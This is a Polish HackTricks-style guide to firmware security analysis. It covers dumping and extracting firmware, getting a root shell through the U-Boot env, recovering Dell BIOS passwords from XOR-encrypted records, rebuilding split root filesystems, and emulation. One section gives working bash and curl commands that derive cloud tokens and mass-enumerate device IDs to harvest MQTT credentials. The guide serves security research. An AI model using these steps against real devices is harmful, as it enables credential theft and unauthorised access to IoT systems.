# Analiza firmware

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **Wprowadzenie**

### Powiązane zasoby

Informacje o pozyskiwaniu danych z dostępnych interfejsów sprzętowych znajdziesz w artykułach [Zrzut firmware’u z pomocą konsoli UART](../hardware-hacking/uart.md#dumping-firmware-with-uart-console) i [Zrzut pamięci flash SPI](../hardware-hacking/spi.md#dumping-firmware-from-eeproms). Informacje o powtarzalnym przechwytywaniu danych UART podczas uruchamiania, przed uzyskaniem dostępu do konsoli, znajdziesz w artykule [Sterowanie zasilaniem przez SCPI i akwizycja za pomocą oscyloskopu](../hardware-hacking/uart.md#automating-boot-time-uart-capture-with-scpi).

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware to niezbędne oprogramowanie, które umożliwia prawidłowe działanie urządzeń, zarządzając komunikacją między komponentami sprzętowymi a oprogramowaniem, z którym użytkownicy wchodzą w interakcję. Jest przechowywane w pamięci trwałej, dzięki czemu urządzenie ma dostęp do kluczowych instrukcji od chwili włączenia, co prowadzi do uruchomienia systemu operacyjnego. Analiza firmware’u i jego potencjalna modyfikacja to kluczowy etap identyfikowania luk w zabezpieczeniach.<sup>[[2]](#references)[[3]](#references)</sup>

## **Zbieranie informacji**

**Zbieranie informacji** to kluczowy wstępny etap pozwalający zrozumieć budowę urządzenia i wykorzystywane przez nie technologie. Proces ten obejmuje gromadzenie danych dotyczących:

- Architektury CPU i uruchomionego systemu operacyjnego
- Szczegółów dotyczących bootloadera
- Układu sprzętowego i dokumentacji technicznej
- Metryk bazy kodu i lokalizacji źródeł
- Zewnętrznych bibliotek i typów licencji
- Historii aktualizacji i certyfikatów zgodności z przepisami
- Diagramów architektury i przepływu
- Ocen bezpieczeństwa i zidentyfikowanych luk

W tym celu nieocenione są narzędzia **open-source intelligence (OSINT)**, podobnie jak analiza dostępnych komponentów open source za pomocą ręcznych i automatycznych procesów przeglądu. Narzędzia takie jak [Coverity Scan](https://scan.coverity.com) i [LGTM firmy Semmle](https://lgtm.com/#explore) oferują bezpłatną analizę statyczną, którą można wykorzystać do wykrywania potencjalnych problemów.

## **Pozyskiwanie firmware’u**

Firmware można pozyskać na różne sposoby, z których każdy charakteryzuje się innym poziomem złożoności:

- Bezpośrednio ze źródła (od programistów lub producentów)
- Budując go na podstawie dostarczonych instrukcji
- Pobierając go z oficjalnych stron pomocy technicznej
- Używając zapytań **Google dork** do wyszukiwania udostępnionych plików firmware’u
- Uzyskując bezpośredni dostęp do **cloud storage** za pomocą narzędzi takich jak [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Przechwytując **aktualizacje** za pomocą technik man-in-the-middle
- **Ekstrahując** firmware z urządzenia przez połączenia takie jak **UART**, [**JTAG**](../hardware-hacking/jtag.md#halting-the-cpu-and-dumping-memoryflash) lub **PICit**
- **Nasłuchując** żądań aktualizacji w komunikacji urządzenia
- Identyfikując i wykorzystując **zakodowane na stałe punkty końcowe aktualizacji**
- **Zrzucając** dane z bootloadera lub sieci
- **Wyjmując i odczytując** układ pamięci, gdy inne metody zawiodą, za pomocą odpowiednich narzędzi sprzętowych

### Logi tylko z UART: wymuszenie powłoki root przez środowisko U-Boot we flashu

Jeśli RX UART jest ignorowane (dostępne są tylko logi), nadal można wymusić uruchomienie powłoki init, **edytując offline blob środowiska U-Boot**:<sup>[[6]](#references)</sup>

1. Zrzuć pamięć flash SPI za pomocą klipsa SOIC-8 i programatora (3,3 V):
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. Zlokalizuj partycję env U-Boot, edytuj `bootargs`, dodając `init=/bin/sh`, i **ponownie oblicz CRC32 env U-Boot dla blobu**.
3. Zapisz ponownie tylko partycję env i uruchom ponownie urządzenie; na UART powinien pojawić się shell.

Jest to przydatne w przypadku urządzeń wbudowanych, w których shell bootloadera jest wyłączony, ale partycję env można zapisywać za pomocą zewnętrznego dostępu do pamięci flash.

## Analizowanie firmware

Teraz, gdy **masz firmware**, musisz wyodrębnić z niego informacje, aby wiedzieć, jak z nim postępować. Możesz do tego użyć różnych narzędzi:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

Jeśli za pomocą tych narzędzi nie znajdziesz zbyt wiele, sprawdź **entropię** obrazu za pomocą `binwalk -E <bin>`. Niska entropia oznacza, że obraz prawdopodobnie nie jest zaszyfrowany. Wysoka entropia oznacza, że prawdopodobnie jest zaszyfrowany (lub w jakiś sposób skompresowany).

Możesz też użyć tych narzędzi, aby wyodrębnić **pliki osadzone w firmware**:

{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Możesz też użyć [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)), aby sprawdzić plik.

### Surowe zasoby wyświetlacza w zewnętrznej pamięci flash

Zrzut zewnętrznego SPI nie musi zawierać wykonywalnego firmware układu MCU. W przypadku celu Cortex-M porównaj początek każdego potencjalnego obszaru kodu z mapą pamięci urządzenia: typowa tablica wektorów zaczyna się od wiarygodnego wskaźnika stosu SRAM i adresu procedury obsługi resetu znajdującego się w pamięci wykonywalnej. Brak tablicy wektorów pod offsetem zero sam w sobie nie dowodzi, że cały układ nie zawiera kodu; sprawdź inne offsety i układ rozruchu. Jeśli `binwalk` nie wykrywa kontenera, sprawdź surowe bajty i powiąż adresy odczytu flash z [dekodowanym przechwyceniem SPI](../hardware-hacking/spi.md#reconstructing-spi-flash-reads-with-a-logic-analyzer) z czynnościami powodującymi wczytanie nowych ekranów.<sup>[[14]](#references)</sup>

W przypadku obszaru z zasobami wyświetlacza sprawdź różne formaty pikseli i wymiary, zamiast zakładać, że użyto PNG/JPEG. W opisanym urządzeniu użyto klatek **80×160 RGB565 little-endian**: przy dwóch bajtach na piksel klatka ma **25 600 bajtów** (25 KiB), a nie 24 kilobity. Odczytany adres flash wskazał offset zasobu ekranu; badacz przekonwertował przygotowany obraz za pomocą `ffmpeg -i bubo.jpg -pix_fmt rgb565le test.rgb`, zastąpił zasób o takiej samej wielkości w oryginalnym zrzucie, zapisał go za pomocą `flashrom -p linux_spi:dev=/dev/spidev0.0 -w flashme.bin` i potwierdził wyświetlenie nowego obrazu. Pokazuje to, że można zapisywać *zewnętrzne zasoby wyświetlacza*, a nie wyodrębniać ani ponownie flashować wewnętrzny firmware układu MCU. Zachowaj oryginalny zrzut i przed zapisem sprawdź wymiary, kolejność bajtów, offset oraz długość zastępowanych danych.<sup>[[14]](#references)</sup>

### Różnicowa analiza flash i możliwe do odzyskania magazyny sekretów XOR

Jeśli format przechowywania ustawienia firmware nie jest udokumentowany, najpierw wykonaj kilka odczytów flash w tych samych warunkach, zmień **dokładnie jedno** ustawienie, ponownie zrzutuj cały układ i porównaj offsety. Powtórzenie eksperymentu z kontrolowanymi wartościami pozwala odróżnić dane ustawienia od liczników i metadanych zapisu; zmiany pojawiające się pod nowymi offsetami, zamiast w miejscu istniejących danych, wskazują na magazyn dopisywany wyłącznie na końcu lub o strukturze logu. Zachowaj wpisy oznaczone jako usunięte — ich bajty mogą nadal dać się odzyskać.<sup>[[12]](#references)[[13]](#references)</sup>

```bash
sha256sum baseline-1.bin baseline-2.bin baseline-3.bin
cmp -l baseline-1.bin changed.bin
```

Po zlokalizowaniu regionu wyodrębnij moduły firmware za pomocą narzędzi takich jak `binwalk` i przeanalizuj w Ghidra funkcje zapisujące i walidujące. Potwierdź w kodzie granice pól, padding, indeksowanie klucza i jego wyprowadzanie, zamiast wnioskować o schemacie wyłącznie na podstawie wzorców w ciphertext.<sup>[[12]](#references)</sup>

#### Odzyskiwanie kluczy z zaszyfrowanego paddingu zerowego

Jak opisano w [szyfrowaniu opartym na XOR](../../crypto/symmetric/#xor-based-encryption), znany tekst jawny ujawnia bajty strumienia klucza na tych samych pozycjach. Pole o stałym rozmiarze jest szczególnie podatne, gdy jego padding zerowy obejmuje wszystkie indeksy powtarzającego się klucza XOR: zaszyfrowany padding ujawnia te bajty klucza bezpośrednio, ponieważ `0x00 XOR key_byte = key_byte`. Jeśli uwzględniono wszystkie indeksy klucza, odtwórz klucz z końcowej części ciphertextu i odszyfruj zapisane bajty.<sup>[[12]](#references)</sup>

Podatny format hasła BIOS-u DVAR firmy Dell jest konkretnym przykładem: bajt `0` pola o długości 32 bajtów jest tekstem jawnym, a bajty `1..31` są szyfrowane powtarzającym się kluczem o długości 20 bajtów.<sup>[[12]](#references)</sup>

```text
stored[0] = password[0]
stored[i] = password[i] XOR key[(i - 1) mod 20]  # i = 1..31
```

Dla hasła o długości `L` pozycje `L..31` miały wartość zero przed operacją XOR. Gdy `L <= 12`, pozycje te obejmują każdy indeks klucza, więc cały klucz i hasło można odzyskać bez brute force:<sup>[[12]](#references)</sup>

```text
key[(i - 1) mod 20] = stored[i]                  # padding positions
password[i] = stored[i] XOR key[(i - 1) mod 20] # populated positions
```

#### Odzyskiwanie kluczy z historycznych rekordów

Nie analizuj każdego rekordu niezależnie. Klucz DVAR jest wyprowadzany w przybliżeniu jako `modified_md5(device_seed || variable_GUID || password[0])`: seed urządzenia i GUID są stałe, a jedynym wejściem zależnym od hasła jest pierwszy bajt w postaci jawnej. Daje to maksymalnie 256 kluczy na urządzenie, a rekordy zaczynające się od tego samego bajtu współdzielą klucz. Grupuj aktywne i usunięte rekordy według tego bajtu; krótki historyczny rekord może ujawnić cały klucz za pomocą paddingu i umożliwić odszyfrowanie aktualnego, dłuższego rekordu, którego własny padding jest niewystarczający. Rotacja hasła może więc zwiększyć ekspozycję, gdy stary ciphertext zostaje oznaczony jako usunięty, zamiast skasowany.<sup>[[12]](#references)</sup>

Narzędzie [`dellpwn`](https://github.com/R3n5k1/dellpwn) lokalizuje DVAR, weryfikuje kandydatów na rekordy, odzyskuje hasła i może wyświetlać surowe bajty zapisanych danych/klucza. Zbuduj je z checkoutu i przeskanuj zweryfikowany obraz flash w następujący sposób:<sup>[[13]](#references)</sup>

```bash
cargo install --path .
dellpwn scan dump.bin --raw
dellpwn scan dump.bin --partial  # include uncertain recoveries
```

W przypadku własnych parserów odrzucaj wyniki fałszywie pozytywne, sprawdzając strukturę rekordów, ograniczenia dotyczące drukowalnych znaków, wypełnienie zerami, entropię klucza oraz spójność w miejscu zawijania się klucza. Jeśli powtarzane zrzuty pokazują nieliczne zmiany bitów przy każdym zapisie, wylicz zaobserwowane maski i uszereguj możliwe korekty według tych ograniczeń, ale niejednoznaczne znaki oznaczaj jako niejednoznaczne, zamiast przedstawiać wynik heurystyczny jako dokładnie odzyskany.<sup>[[12]](#references)</sup>

Weryfikatory haseł powinny przechowywać solony, iterowany hash jednokierunkowy, a nie odwracalny szyfrogram, zaś magazyny o strukturze dziennika powinny bezpiecznie usuwać zastąpione dane tajne.<sup>[[12]](#references)</sup>

### Pobieranie systemu plików

Za pomocą wspomnianych wcześniej narzędzi, takich jak `binwalk -ev <bin>`, powinno się udać **wyodrębnić system plików**.\
Binwalk zazwyczaj wyodrębnia go do **folderu o nazwie odpowiadającej typowi systemu plików**; zwykle jest to jeden z następujących typów: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Ręczne wyodrębnianie systemu plików

Czasami binwalk **nie ma bajtu magicznego systemu plików wśród swoich sygnatur**. W takich przypadkach użyj binwalk, aby **znaleźć offset systemu plików i wyciąć skompresowany system plików** z pliku binarnego, a następnie **ręcznie go wyodrębnić** zgodnie z jego typem, wykonując poniższe kroki.

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

Uruchom następujące **polecenie dd**, aby wyodrębnić system plików Squashfs.

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

Alternatywnie można również uruchomić następujące polecenie.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Dla squashfs (używanego w powyższym przykładzie)

`$ unsquashfs dir.squashfs`

Pliki znajdą się później w katalogu "`squashfs-root`".

- Pliki archiwum CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Dla systemów plików jffs2

`$ jefferson rootfsfile.jffs2`

- Dla systemów plików ubifs z pamięcią NAND

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

### Odtwarzanie podzielonych głównych systemów plików urządzeń wbudowanych

Jeśli surowy zrzut eMMC/SSD zawiera prawidłowy nagłówek systemu plików, ale przesunięcia metadanych wykraczają poza nominalną partycję, nie klasyfikuj go od razu jako uszkodzonego. Kod rozruchowy urządzenia wbudowanego może złożyć rzeczywiste urządzenie główne z wielu zakresów fizycznych za pomocą Device Mapper, więc wyodrębnienie danych z jednej partycji GPT daje tylko pierwszy segment.<sup>[[9]](#references)</sup>

#### Wstępna analiza pełnego obrazu nośnika

Najpierw sprawdź, czy pozyskiwanie danych zostało zakończone, rozmiar obrazu jest stabilny i żaden proces nie zapisuje już do pliku obrazu. Jeśli nazwa pliku zawiera adres początkowy/końcowy, porównaj ten zakres z rzeczywistą liczbą bajtów. Odzyskaj GPT w trybie tylko do odczytu i dołącz tylko wymagany zakres; **nie** uruchamiaj `vgchange -ay` na niezaufanym woluminie fizycznym na stacji roboczej, ponieważ może to spowodować kolizje grup woluminów i niezamierzone zapisy.<sup>[[9]](#references)</sup>

```bash
stat -c '%s bytes' firmware.bin
lsof -- firmware.bin
fdisk -l firmware.bin
parted firmware.bin unit B print

# Inspect one partition without copying it
sudo losetup --find --show --read-only \
  --offset "$PART_OFF" --sizelimit "$PART_LEN" firmware.bin
```

Preferuj jednorazową maszynę wirtualną, gdy oryginalna logika init lub stos LVM musi widzieć cały obraz. Historyczne logi rozruchu ze standardowej partycji rozruchowej są szczególnie przydatne: bootloader mógł zapisać offsety w zastrzeżonym kontenerze, długości komponentów, wybór slotu, reguły wyrównania i weryfikację podpisu. Użyj tych wartości, aby wyodrębnić osadzoną linię poleceń, kernel i initramfs, a następnie niezależnie zweryfikuj każdy plik za pomocą `file`, bajtów sygnatury i `binwalk`; odczyt do końca kontenera może przypadkowo dołączyć do kernela initrd, obiekt ACPI lub podpis.<sup>[[9]](#references)</sup>

#### Odtwórz mapę bloków używaną podczas rozruchu

Wyodrębnij initramfs kernela i przeanalizuj wstecz jego `/init` oraz biblioteki pamięci masowej. W [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/) wyszukaj odwołania do ciągów `/proc/cmdline`, `/dev/mapper/`, `dmsetup`, `BLKGETSIZE64` i ścieżek partycji, a następnie prześledź kod wybierający aktywny slot A/B i tworzący tabelę. Przydatne punkty początkowe w radare2 to `r2 -A init`, `afl`, `pdf @ main` i `pdf @ fcn.xxxxx`.<sup>[[9]](#references)</sup>

Cel linear mapuje kolejne zakresy urządzenia wirtualnego na zakresy jednego lub większej liczby urządzeń bazowych. Odzyskana tabela z dwoma segmentami często ma następującą postać (wszystkie pozycje i długości podano w sektorach po 512 bajtów):<sup>[[9]](#references)[[10]](#references)</sup>

```text
0              <seg1_sectors> linear /dev/mmcblk0p2 0
<seg1_sectors> <seg2_sectors> linear /dev/mmcblk0p4 <tail_start>
```

Odtwórz dokładnie arytmetykę kodu maszynowego, w tym szerokość liczby całkowitej, przesunięcia i konwersje jednostek. Na przykład poniższe wyrażenie zaokrągla rozmiar w bajtach w dół do granicy 4 KiB, a dopiero potem konwertuje go na sektory 512-bajtowe; zastąpienie go przez `p4_bytes // 512` przesuwa wybrany końcowy fragment o `p4_bytes % 4096`, gdy partycja nie jest wyrównana do strony.<sup>[[9]](#references)</sup>

```python
p4_sectors = (p4_bytes >> 12) << 3
effective_bytes = p4_sectors * 512
tail_start = effective_bytes - tail_distance
```

Odtwórz płaski obraz analityczny, kopiując zakresy w kolejności z tabeli, porcjami o ograniczonym rozmiarze, zamiast wczytywać cały zrzut nośnika do pamięci. Pozwala to również uniknąć tworzenia urządzeń mappera po stronie hosta. Zachowaj osobne asercje dotyczące offsetów wyznaczonych na podstawie GPT, odwróconych liczników sektorów i wynikowej długości pliku wyjściowego.<sup>[[9]](#references)</sup>

#### Odróżnij uszkodzenie danych od stałego błędu rekonstrukcji

W przypadku SquashFS sprawdź magic `hsqs` i odczytaj 64-bitowe pole `bytes_used` w formacie little-endian, znajdujące się pod offsetem 40 w superbloku, zanim uruchomisz `unsquashfs`. Jeśli ekstrakcja nie powiedzie się w kilku niezwiązanych ze sobą strukturach, przeszukaj szerokie okno wokół oczekiwanych pozycji i wymagaj mocnych przesłanek strukturalnych: dekompresowalnego bloku metadanych, kilku kolejnych prawidłowych wpisów katalogu, wiarygodnych pól inode, inode głównego katalogu zgodnego z liczbą inode’ów lub prawidłowej struktury metadanych integralności. Pojedyncze dopasowanie magic nie wystarczy.<sup>[[9]](#references)</sup>

```python
import struct

with open("rootfs.img", "rb") as f:
    sb = f.read(96)
assert sb[:4] == b"hsqs"
bytes_used = struct.unpack_from("<Q", sb, 40)[0]
nominal_end = (bytes_used + 4095) & ~4095
print(hex(bytes_used), hex(nominal_end))
```

Gdy ta sama signed delta sprawia, że niezależne struktury stają się poprawne — na przykład metadane katalogu i rekord verity — prawdopodobną przyczyną jest systematyczny błąd początku segmentu, a nie brakujące bajty. Wróć do odwróconych obliczeń i sprawdź, czy nie pominięto reszt, nie wystąpił problem z signedness lub przepełnieniem ani zaokrąglanie do granic sektorów lub stron, zanim spróbujesz odzyskać osierocone dane lub poprawiać metadane systemu plików.<sup>[[9]](#references)</sup>

Na koniec rozdziel granice ochrony: woluminy LUKS z kluczami zapieczętowanymi w TPM chronią poufność danych, natomiast podpisane mapowanie dm-verity chroni integralność głównego systemu plików. Programowy TPM nie odzyska klucza zapieczętowanego w oryginalnym fizycznym TPM, a uruchomienie zmodyfikowanego SquashFS przez init przeznaczony wyłącznie do badań, który pomija weryfikację verity, nie fałszuje jego podpisu ani nie łamie dm-verity.<sup>[[9]](#references)</sup>

## Analiza firmware’u

Po uzyskaniu firmware’u należy go dokładnie przeanalizować, aby zrozumieć jego strukturę i potencjalne podatności. W tym celu wykorzystuje się różne narzędzia do analizy i wyodrębniania cennych danych z obrazu firmware’u.

### Narzędzia do wstępnej analizy

Poniżej podano zestaw poleceń do wstępnej inspekcji pliku binarnego (oznaczonego jako `<bin>`). Polecenia te pomagają określić typy plików, wyodrębnić ciągi znaków, przeanalizować dane binarne oraz poznać szczegóły dotyczące partycji i systemu plików:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

Aby ocenić, czy obraz jest zaszyfrowany, sprawdza się jego **entropię** za pomocą `binwalk -E <bin>`. Niska entropia sugeruje brak szyfrowania, natomiast wysoka może wskazywać na szyfrowanie lub kompresję.

Do wyodrębniania **osadzonych plików** polecane są narzędzia i zasoby, takie jak dokumentacja **file-data-carving-recovery-tools** oraz **binvis.io** do inspekcji plików.

### Wyodrębnianie systemu plików

Za pomocą `binwalk -ev <bin>` można zwykle wyodrębnić system plików, często do katalogu nazwanego zgodnie z jego typem (np. squashfs, ubifs). Jeśli jednak **binwalk** nie rozpoznaje typu systemu plików z powodu braku bajtów magicznych, konieczne jest ręczne wyodrębnienie. Polega ono na użyciu `binwalk` do ustalenia przesunięcia systemu plików, a następnie polecenia `dd` do wyodrębnienia systemu plików:

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

Następnie, w zależności od typu systemu plików (np. squashfs, cpio, jffs2, ubifs), używa się różnych poleceń do ręcznego wyodrębnienia zawartości.

### Analiza systemu plików

Po wyodrębnieniu systemu plików rozpoczyna się poszukiwanie luk w zabezpieczeniach. Zwraca się uwagę na niezabezpieczone demony sieciowe, zakodowane na stałe dane uwierzytelniające, punkty końcowe API, funkcje serwera aktualizacji, nieskompilowany kod, skrypty startowe oraz skompilowane pliki binarne przeznaczone do analizy offline.

**Kluczowe lokalizacje** i **elementy** do sprawdzenia:

- **etc/shadow** i **etc/passwd** — dane uwierzytelniające użytkowników
- Certyfikaty i klucze SSL w **etc/ssl**
- Pliki konfiguracyjne i skrypty pod kątem potencjalnych luk
- Wbudowane pliki binarne do dalszej analizy
- Typowe serwery WWW i pliki binarne urządzeń IoT

Kilka narzędzi pomaga wykrywać poufne informacje i luki w systemie plików:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) i [**Firmwalker**](https://github.com/craigz28/firmwalker) do wyszukiwania poufnych informacji
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) do kompleksowej analizy firmware’u
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) i [**EMBA**](https://github.com/e-m-b-a/emba) do analizy statycznej i dynamicznej

### Kontrole bezpieczeństwa skompilowanych plików binarnych

Zarówno kod źródłowy, jak i skompilowane pliki binarne znalezione w systemie plików należy dokładnie sprawdzić pod kątem luk. Narzędzia takie jak **checksec.sh** dla plików binarnych Unix i **PESecurity** dla plików binarnych Windows pomagają wykrywać niezabezpieczone pliki binarne, które można wykorzystać.

## Pozyskiwanie konfiguracji chmurowej i danych uwierzytelniających MQTT za pomocą tokenów URL wyliczanych lokalnie

Wiele hubów IoT pobiera konfigurację przypisaną do urządzenia z punktu końcowego w chmurze, który wygląda tak:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Podczas analizy firmware’u można odkryć, że `<token>` jest wyliczany lokalnie na podstawie identyfikatora urządzenia przy użyciu zakodowanego na stałe sekretu, na przykład:

- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex

Taka konstrukcja pozwala każdemu, kto pozna deviceId i STATIC_KEY, odtworzyć URL i pobrać konfigurację z chmury, która często ujawnia dane uwierzytelniające MQTT w postaci jawnego tekstu oraz prefiksy tematów.

Praktyczny przebieg pracy:

1) Wyodrębnij deviceId z logów rozruchowych UART

- Podłącz adapter UART 3,3 V (TX/RX/GND) i przechwyć logi:

```bash
picocom -b 115200 /dev/ttyUSB0
```

- Szukaj wierszy wyświetlających wzorzec adresu URL konfiguracji chmury i adres brokera, na przykład:

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) Odzyskaj STATIC_KEY i algorytm tokena z firmware

- Załaduj pliki binarne do Ghidra/radare2 i wyszukaj ścieżkę konfiguracji ("/pf/") lub użycie MD5.
- Potwierdź algorytm (np. MD5(deviceId||STATIC_KEY)).
- Wyznacz token w Bashu i zamień skrót na wielkie litery:

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) Zbierz konfigurację chmury i dane uwierzytelniające MQTT

- Złóż URL i pobierz JSON za pomocą curl; przeanalizuj go przy użyciu jq, aby wyodrębnić sekrety:

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) Wykorzystaj MQTT bez szyfrowania i słabe ACL tematów (jeśli występują)

- Użyj odzyskanych poświadczeń, aby zasubskrybować tematy konserwacyjne i wyszukać wrażliwe zdarzenia:

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) Enumeruj przewidywalne identyfikatory urządzeń (na dużą skalę, za zgodą)

- Wiele ekosystemów używa bajtów OUI/produktu/typu dostawcy, po których następuje sekwencyjny sufiks.
- Możesz iterować po kandydujących identyfikatorach, programowo wyprowadzać tokeny i pobierać konfiguracje:

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

Notatki
- Zawsze uzyskaj wyraźną zgodę przed podjęciem prób masowego enumerowania.
- Jeśli to możliwe, w celu odzyskania sekretów preferuj emulację lub analizę statyczną zamiast modyfikowania sprzętu docelowego.


Proces emulacji firmware umożliwia **analizę dynamiczną** działania urządzenia lub pojedynczego programu. Podejście to może wiązać się z wyzwaniami związanymi z zależnościami od sprzętu lub architektury, ale przeniesienie głównego systemu plików lub określonych plików binarnych na urządzenie o zgodnej architekturze i kolejności bajtów, takie jak Raspberry Pi, albo na gotową maszynę wirtualną może ułatwić dalsze testy.

### Emulowanie pojedynczych plików binarnych

Podczas badania pojedynczych programów kluczowe jest ustalenie ich kolejności bajtów i architektury procesora.

#### Przykład z architekturą MIPS

Aby emulować plik binarny dla architektury MIPS, można użyć polecenia:

```bash
file ./squashfs-root/bin/busybox
```

A także, aby zainstalować niezbędne narzędzia emulacyjne:

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

Dla MIPS (big-endian) używa się `qemu-mips`, a w przypadku plików binarnych little-endian — `qemu-mipsel`.

#### Emulacja architektury ARM

W przypadku plików binarnych ARM proces jest podobny — do emulacji używa się emulatora `qemu-arm`.

### Emulacja pełnego systemu

Narzędzia takie jak [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) i inne umożliwiają emulację całego firmware'u, automatyzując ten proces i ułatwiając analizę dynamiczną.

### Odtwarzanie podzielonych i weryfikowanych systemów plików root na potrzeby emulacji

Jeśli superblok SquashFS jest czytelny, ale przesunięcia inode'ów, katalogów lub tabeli fragmentów są niemożliwe, nie modyfikuj od razu `unsquashfs`. Przeanalizuj wczesny plik binarny rozruchu i odtwórz graf urządzeń blokowych, który tworzy: systemy wbudowane mogą udostępniać nominalną partycję root, ale konstruować rzeczywisty system plików za pomocą mapowania `dm-linear`, które dołącza sektory pobrane z innej partycji. Kontrole obejmujące wyłącznie superblok mogą się powieść, nawet jeśli wszystkie późniejsze bloki metadanych są przesunięte.<sup>[[11]](#references)</sup>

Zachowaj dokładnie arytmetykę zastosowaną w firmware. W szczególności ustal, czy długości są wyrażone w bajtach, sektorach 512-bajtowych czy stronach 4 KiB; odtwórz przesunięcia bitowe i obcinanie wartości w oryginalnej kolejności; uwzględnij też zależne od banku obszary końcowe w układach A/B. Na przykład `(partition_bytes >> 12) << 3` najpierw obcina wartość do granicy 4 KiB, a dopiero potem wyraża wynik w sektorach 512-bajtowych; zastąpienie tego wyrażeniem `partition_bytes // 512` może przesunąć dołączany obszar o kilka kilobajtów i uszkodzić wszystkie dalsze tabele SquashFS.<sup>[[11]](#references)</sup>

Przydatny proces walidacji:<sup>[[11]](#references)</sup>

1. Odtwórz z pliku binarnego weryfikatora/init urządzenie źródłowe, sektor początkowy i długość każdego segmentu `dm-linear`.
2. Połącz lub zmapuj obszary, nie zmieniając zasad ich wyrównania.
3. Jeśli ekstrakcja nadal się nie powiedzie, przeszukaj tylko niewielki obszar wokół przewidywanej granicy i wymagaj kilku kolejnych poprawnych struktur metadanych, zamiast akceptować sam wiarygodnie wyglądający superblok.
4. Uruchom niezmodyfikowane `unsquashfs` na odtworzonym obrazie; poprawne przejście przez wszystkie katalogi i fragmenty jest mocniejszym dowodem niż wynik `unsquashfs -stat`.

#### Zastąpienie dm-verity kontrolowane przez analityka

Gdy analityk kontroluje jądro QEMU, initramfs i dyski wirtualne, zmodyfikowany root można uruchomić, zastępując weryfikujący PID 1 dostawcy niewielkim, statycznie linkowanym init. Jest to **zastąpienie łańcucha rozruchowego w laboratorium**, a nie złamanie dm-verity, jego podpisu RSA, Secure Boot ani klucza zabezpieczonego przez TPM.<sup>[[11]](#references)</sup>

